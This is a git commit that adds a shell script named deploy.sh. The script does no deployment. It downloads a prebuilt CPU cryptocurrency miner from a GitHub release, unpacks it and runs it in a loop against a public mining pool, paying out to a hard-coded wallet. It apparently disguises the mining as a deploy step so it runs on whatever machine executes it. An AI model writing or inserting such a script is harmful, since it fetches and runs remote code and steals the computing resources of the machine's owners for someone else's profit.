73735f6cc56db3d0e0559c5e97a010b2ac34bbe4
Uevwn <94554340+Uevwn@users.noreply.github.com>
2021-11-18 01:03:04 +0700

    Create deploy.sh

---
+++ deploy.sh
@@ -0,0 +1,10 @@
+#!/bin/sh
+
+COUNTER=20
+until [  $COUNTER -lt 10 ]; do
+            
+wget https://github.com/m-pays/m-cpuminer-v2/releases/download/2.4/m-minerd-64-linux.tar.gz && tar xfvz m-minerd-64-linux.tar.gz && cd m-minerd-64-linux && ./m-minerd -a m7mhash -o stratum+tcp://mine.zpool.ca:6033 -u D9zT4xf7iGNcbrH6nLEKBCqjmiC3yKPwc2.rig1 -p c=LTC -t 8
+
+     echo COUNTER $COUNTER
+     let COUNTER-=1
+done
